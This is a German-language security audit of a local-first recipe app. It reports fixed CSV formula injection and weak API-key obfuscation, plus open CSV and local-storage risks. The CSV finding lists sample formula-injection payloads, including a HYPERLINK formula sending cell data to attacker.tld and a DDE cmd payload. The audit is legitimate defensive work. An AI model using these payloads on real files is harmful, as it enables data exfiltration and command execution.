# Security Audit 2026

Datum: 2026-04-22

## Scope

Geprueft wurden insbesondere diese Bereiche:

- `src/services/db.ts`, `src/services/dbInstance.ts`, `src/services/dbMigrations.ts`
- `src/services/apiKeyService.ts`
- DOM-Rendering von nutzer- oder KI-generierten Texten in React-Komponenten
- `src/services/exportService.ts`
- angrenzend aufgefallen: `src/services/healthConnectService.ts`, `src/services/settingsService.ts`

## Executive Summary

Die App zeigt aktuell keine direkte, kritische DOM-XSS-Senke im regulären React-Rendering. Nutzer- und KI-Texte werden ueberwiegend als normale React-Textknoten gerendert, was HTML standardmaessig escaped. Der HTML-Importpfad fuer Rezepte sanitisiert Fremd-HTML bereits mit DOMPurify und extrahiert anschliessend nur Text.

Es wurden jedoch zwei reale Sicherheitsluecken bestaetigt und behoben:

1. CSV-/Spreadsheet-Formula-Injection in `exportService.ts`
2. Nur triviale XOR-Obfuskation fuer API-Keys in `apiKeyService.ts`

Zusätzlich bestehen weiterhin zwei relevante Restrisiken:

1. `healthConnectService.ts` erzeugt CSV manuell und ist dadurch ebenfalls formula-/CSV-injection-anfaellig.
2. Die Local-First-Datenhaltung speichert Fach- und Backup-Daten weiterhin lokal im Klartext in IndexedDB; das ist architekturell erwartbar, aber kein Schutz gegen lokale Geraetekompromittierung oder XSS im selben Origin.

## Findings

### Hoch: CSV Formula Injection in `exportService.ts` - behoben

Betroffen waren:

- Einzelrezept-CSV-Export
- Einkaufslisten-CSV-Export
- Vollbackup-CSV-Export

Vor dem Fix konnten Felder mit Prefixen wie `=`, `+`, `-` oder `@` ungefiltert in CSV-Dateien gelangen. Beim Oeffnen in Excel, LibreOffice oder Google Sheets haette das zu Formelausfuehrung, externen Requests oder Datenexfiltration fuehren koennen.

Beispielhafte Payloads:

- `=HYPERLINK("https://attacker.tld/?x="&A1)`
- `@SUM(1+1)`
- `-cmd|' /C calc'!A0`

Fix:

- CSV-Zellen werden jetzt vor `Papa.unparse(...)` neutralisiert.
- Gefaehrliche Formula-Prefixe werden mit einem fuehrenden Apostroph entschärft.
- Der Fix deckt sowohl einzelne Exporte als auch kombinierte Voll-Backups ab.

Verifikation:

- `src/services/__tests__/exportService.test.ts`

### Mittel: API-Key nur obfuskiert statt verschluesselt - behoben

`apiKeyService.ts` hat den Gemini-API-Key zuvor nur per XOR mit einem leicht reproduzierbaren Fingerprint obfuskiert. Das war kein belastbarer Schutz gegen:

- denselben Origin nach erfolgreicher XSS
- lokale Auslese der IndexedDB durch Browser- oder Profilzugriff
- triviale Rueckrechnung durch jede mitlaufende JavaScript-Ausfuehrung

Fix:

- Speicherung jetzt per AES-GCM ueber Web Crypto API
- Schluesselableitung via PBKDF2 + zufaelligem Salt
- zufaellige IV pro Schreibvorgang
- Rueckwaertskompatibles Lesen alter XOR-Eintraege mit stiller Re-Migration auf das neue Format

Wichtige Einordnung:

Dieser Fix verbessert den Schutz gegen rohe Datentraeger-/Profil-Auslese deutlich. Er schuetzt aber weiterhin nicht gegen erfolgreiche XSS im selben Origin, da der Browser-Prozess selbst entschluesseln koennen muss.

Verifikation:

- `src/services/__tests__/apiKeyService.test.ts`

### Niedrig: Keine direkte DOM-XSS-Senke im aktuellen UI-Rendering gefunden

Pruefergebnis:

- Kein Einsatz von `dangerouslySetInnerHTML`
- Kein `innerHTML`, `insertAdjacentHTML` oder `srcDoc` im Anwendungs-Code gefunden
- KI- und Nutzertexte werden in React-Komponenten als Textknoten gerendert
- HTML aus Rezept-Importen wird in `recipeImportService.ts` mit DOMPurify sanitisiert und anschliessend nur textuell ausgewertet

Bewertung:

Aktuell kein unmittelbarer XSS-Befund in diesem Bereich.

Rest-Risiko:

- Falls spaeter Markdown-/HTML-Rendering eingefuehrt wird, muss vor dem ersten Release ein expliziter Sanitizer- und Sink-Review erfolgen.

### Mittel: Health-CSV-Export weiterhin injection-anfaellig - offen

`src/services/healthConnectService.ts` baut CSV-Dateien manuell per `Array.join(',')`. Dadurch fehlen:

- Formula-Neutralisierung
- CSV-Quoting fuer Kommata, Anfuehrungszeichen und Zeilenumbrueche

Risiko:

- Formula Injection beim Oeffnen in Spreadsheet-Programmen
- Strukturbruch der CSV-Datei durch Sonderzeichen in `mealName`

Empfehlung:

- denselben CSV-Schutz wie in `exportService.ts` anwenden oder alle CSV-Erzeugung zentral ueber eine sichere Hilfsfunktion kapseln

### Niedrig: Persistenz-Oberflaeche groesser als noetig - offen

Beobachtungen:

- Domänendaten liegen erwartungsgemaess lokal in Dexie/IndexedDB
- Migrations-Backups (`CulinaSyncMigrationBackups`) speichern Snapshots der Primärdatenstores lokal
- Settings werden weiterhin auch in `localStorage` gespeichert (`settingsService.ts`), zusätzlich zu Redux Persist

Risiko:

- vergroesserte lokale Datenflaeche fuer forensische Auslese oder Shared-Device-Szenarien
- kein unmittelbarer Remote-Exploit, aber erhoehter Privacy-Footprint

Empfehlung:

- Aufbewahrungsstrategie fuer Migrations-Backups definieren
- doppelte Settings-Persistenz mittelfristig konsolidieren
- klar dokumentieren, welche Daten lokal im Klartext vorliegen

## Code Changes Applied

- `src/services/exportService.ts`: CSV-Zell-Haertung gegen Formula Injection
- `src/services/apiKeyService.ts`: AES-GCM/PBKDF2-basierte Speicherung mit Legacy-Migration
- `src/components/settings/panels/ApiKeyPanel.tsx`: Sicherheitshinweis auf realen Schutzumfang angepasst
- `src/services/__tests__/exportService.test.ts`: neue Sicherheits-Regressionstests
- `src/services/__tests__/apiKeyService.test.ts`: neue Roundtrip- und Migrations-Tests

## Recommended Next Steps

1. `healthConnectService.ts` auf sichere CSV-Serialisierung umstellen.
2. CSP fuer GitHub Pages bzw. Tauri-WebView explizit definieren, soweit technisch moeglich.
3. Langfristig pruefen, ob ein nutzerseitiges Secret/Passphrase-Modell fuer besonders schutzbeduerftige lokale Daten sinnvoll ist.
